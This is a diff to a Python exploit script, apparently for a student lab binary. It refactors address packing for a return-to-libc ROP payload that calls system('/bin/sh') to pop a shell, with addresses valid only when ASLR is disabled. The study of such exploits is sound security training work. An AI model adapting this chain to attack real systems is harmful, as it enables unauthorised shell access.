@@ -6,7 +6,17 @@ import binascii
 DEBUG = False
 
 
-# addresses valid for disabled aslr:
+def int_to_address(i):
+    # slice off '0x' and create bytearray:
+    x = bytearray.fromhex(hex(i)[2:])
+    # ensure correct length:
+    while len(x) < 8:
+        x = b"\x00" + x
+    # return in reverse byte order:
+    return x[::-1]
+
+
+# addresses valid only with disabled aslr:
 system_call = b"\x00\x00\x7f\xff\xf7\xe1\xf8\x60"[::-1]
 exit_call = b"\x00\x00\x7f\xff\xf7\xe1\x51\x00"[::-1]
 bin_sh_string = b"\x00\x00\x7F\xFF\xF7\xF6\xE8\x82"[::-1]
@@ -114,28 +124,15 @@ print("exit():", hex(exit_call), "(gdb> x/i 0x...)")
 r = p.recvuntil(b"Welcome student! Can you run /bin/sh\n")
 print("\n", r, "\n", sep="")
 
-x = bytearray.fromhex(hex(bin_sh_string)[2:])
-x = b"\x00\x00" + x
-bin_sh_string = x[::-1]
-
-x = bytearray.fromhex(hex(system_call)[2:])
-x = b"\x00\x00" + x
-system_call = x[::-1]
-
-
-x = bytearray.fromhex(hex(exit_call)[2:])
-x = b"\x00\x00" + x
-exit_call = x[::-1]
-
 
 # this payload uses the calculated offset to pop a shell:
 payload2 = (
     buffer
     + backup_base_pointer
     + rop_pop_rdi_ret
-    + bin_sh_string  # aslr.
-    + system_call  # aslr.
-    + exit_call  # aslr.
+    + int_to_address(bin_sh_string)  # aslr.
+    + int_to_address(system_call)  # aslr.
+    + int_to_address(exit_call)  # aslr.
 )
 
 print("> sending second payload")
